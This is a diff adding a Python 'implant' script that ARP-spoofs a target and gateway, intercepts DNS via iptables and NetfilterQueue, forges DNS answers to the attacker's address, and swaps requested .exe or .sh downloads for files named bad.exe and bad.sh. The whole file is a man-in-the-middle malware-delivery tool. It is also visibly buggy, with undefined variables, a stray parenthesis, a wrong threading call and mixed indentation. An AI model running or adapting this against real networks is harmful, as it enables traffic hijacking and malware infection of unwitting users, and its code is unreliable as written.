@@ -1,0 +1,118 @@
+#!/usr/bin/python
+
+import os
+import sys
+import netifaces
+from scapy.all import *
+from netfilterqueue import NetfilterQueue
+from threading import Thread
+run = True
+my_ip = "127.0.0.1"
+
+def getmyip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    return s.getsockname()[0]
+
+def getmymac():
+    netifaces.ifaddresses('eth0')[netifaces.AF_LINK]['addr']
+
+def getmac(mine, theirs):
+    return sr(ARP(op=ARP.who_has, psrc=mine, pdst=theirs))[0][ARP].hwsrc
+
+def sendfile(filename, packet):
+    data = open(filename,"r")
+    raw = "HTTP/1.1 200 OK\r\n\r\n" + data.readlines()
+    new_p = IP(dst=packet[IP].src)/TCP(dport=80)/raw
+    send(new_p)
+
+# constant MITM ARP spoof
+def spoofarp(t_ip, t_mac, r_ip, r_mac):
+    while (run):
+	targetpack = ARP(op=2, pdst=t_ip, psrc=r_ip, hwdst=t_mac)
+	#targetpack.show2()
+	send(targetpack, iface="eth0", verbose=False)
+
+	routerpack = ARP(op=2, pdst=r_ip, psrc=t_ip, hwdst=r_mac)
+	#routerpack.show2()
+	send(routerpack, iface="eth0", verbose=False)
+
+# restore ARP between the target and server
+def rearp(t_ip, t_mac, r_ip, r_mac):
+    while (run):
+	targetpack = ARP(op=2, pdst=t_ip, psrc=r_ip, hwdst=t_mac, hwsrc=r_mac)
+	#targetpack.show2()
+	send(targetpack, iface="eth0", verbose=False)
+
+	routerpack = ARP(op=2, pdst=r_ip, psrc=t_ip, hwdst=r_mac, hwsrc=t_mac)
+	#routerpack.show2()
+	send(routerpack, iface="eth0", verbose=False)
+
+def callback(packet):
+    try:
+        global my_ip
+        data = packet.get_payload()
+	scapy_pkt = IP(data)
+        #scapy_pkt.show()
+	if not scapy_pkt.haslayer(DNSQR):
+	    packet.accept()
+	    return
+        flag = False
+        if TCP in packet and RAW in packet and "GET" in packet[RAW] and "HTTP" in packet[RAW] and packet[TCP] == "PA" and (".exe" in packet[RAW] or ".sh" in packet[RAW]):
+            flag = True
+
+	## spoof new DNS response pkt here ##
+	spoofed_response = IP(src=scapy_pkt[IP].dst, \
+	    dst=scapy_pkt[IP].src) / \
+	    UDP(dport=scapy_pkt[UDP].sport, \
+	    sport=scapy_pkt[UDP].dport) / \
+	    DNS(id=scapy_pkt[DNS].id, qr=1, aa=1, \
+	    qd=scapy_pkt[DNS].qd, \
+	    an=DNSRR(rrname=scapy_pkt[DNS].qd.qname, \
+	    ttl=10, rdata=my_ip))
+        spoofed_response.show2()
+	packet.set_payload(str(spoofed_response))
+	packet.accept()
+
+        if flag:
+            if ".exe" in packet[RAW]:
+                sendfile("bad.exe", packet)
+            if ".sh" in packet[RAW]:
+                sendfile("bad.sh", packet)
+
+    except Exception as e:
+        print "Something went wrong ¯\_(ツ)_/¯\n"
+        print(e)
+
+if len(sys.argv) != 3:
+    print "Usage: ./implant <target ip address> <gateway>"
+    sys.exit(1)
+
+# initialize necessary variables
+try:
+    my_ip = getmyip()
+    my_mac = getmymac()
+    t_ip = sys.argv[1]
+    g_ip = sys.argv[2]
+    t_mac = getmac(my_ip, t_ip)
+    g_mac = getmac(my_ip, g_ip)
+except Exception as e:
+    print "Something went wrong ¯\_(ツ)_/¯\n"
+    print(e)
+
+
+threading.Thread(target=spoofarp, args=(t_ip, t_mac, r_ip, r_mac)).start()
+
+# start queue
+os.system('iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1')
+
+nfqueue = NetfilterQueue()
+nfqueue.bind(1, callback)
+
+try:
+    nfqueue.run()
+except KeyboardInterrupt:
+    run = False
+    rearp(t_ip, t_mac, r_ip, r_mac))
+    print("exiting...")
+    os.system('iptables -t nat -F')
